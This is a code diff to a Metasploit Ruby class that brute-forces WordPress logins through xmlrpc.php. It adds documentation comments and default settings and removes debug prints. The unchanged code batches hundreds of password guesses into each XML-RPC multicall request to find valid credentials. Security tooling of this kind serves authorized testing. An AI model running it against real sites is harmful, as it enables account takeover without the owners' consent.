@@ -8,24 +8,42 @@ module Metasploit
       # Wordpress XML RPC login scanner
       class WordpressRPC < HTTP
 
+        # @!attribute passwords
+        #   @return [Array]
         attr_accessor :passwords
 
+        # @!attribute chunk_size
+        #   @return [Fixnum]
         attr_accessor :chunk_size
 
+        # @!attribute block_wait
+        #   @return [Fixnum]
         attr_accessor :block_wait
 
+        # @!attribute base_uri
+        #   @return [String]
         attr_accessor :base_uri
 
-        attr_reader :wordpress_url_xmlrpc
+        # @!attribute wordpress_url_xmlrpc
+        #   @return [String]
+        attr_accessor :wordpress_url_xmlrpc
 
         def set_default
           self.wordpress_url_xmlrpc = 'xmlrpc.php'
+          self.block_wait = 6
+          self.base_uri = '/'
+          self.chunk_size = 1800
         end
 
+        # Returns the XML data that is used for the login.
+        #
+        # @param user [String] username
+        # @return [Array]
         def generate_xml(user)
           xml_payloads = []
 
-          # Evil XML | Limit number of log-ins to CHUNKSIZE/request due Wordpress limitation which is 1700 maximum.
+          # Evil XML | Limit number of log-ins to CHUNKSIZE/request due
+          # Wordpress limitation which is 1700 maximum.
           passwords.each_slice(chunk_size) do |pass_group|
             document = Nokogiri::XML::Builder.new do |xml|
               xml.methodCall {
@@ -36,7 +54,6 @@ module Metasploit
                 xml.array {
                 xml.data {
                 pass_group.each  do |pass|
-                  #$stderr.puts "Trying: #{user}:#{pass}"
                   xml.value  {
                   xml.struct {
                   xml.member {
@@ -62,6 +79,10 @@ module Metasploit
           xml_payloads
         end
 
+        # Sends an HTTP request to Wordpress.
+        #
+        # @param xml [String] XML data.
+        # @return [void]
         def send_wp_request(xml)
           opts =
             {
@@ -84,8 +105,11 @@ module Metasploit
         end
 
 
+        # Attempts to login.
+        #
+        # @param credential [Metasploit::Framework::Credential]
+        # @return [Metasploit::Framework::LoginScanner::Result]
         def attempt_login(credential)
-          #$stderr.puts "Testing: #{credential.public}"
           generate_xml(credential.public).each do |xml|
             send_wp_request(xml)
             req_xml = Nokogiri::Slop(xml)
@@ -95,7 +119,6 @@ module Metasploit
               if result.nil?
                 pass = req_xml.search("data/value/array/data")[i].value[1].text.strip
                 credential.private = pass
-                #$stderr.puts "Good: #{credential.inspect}"
                 result_opts = {
                   credential: credential,
                   host: host,
@@ -107,7 +130,6 @@ module Metasploit
               end
             end
           end
-
 
           result_opts = {
             credential: credential,
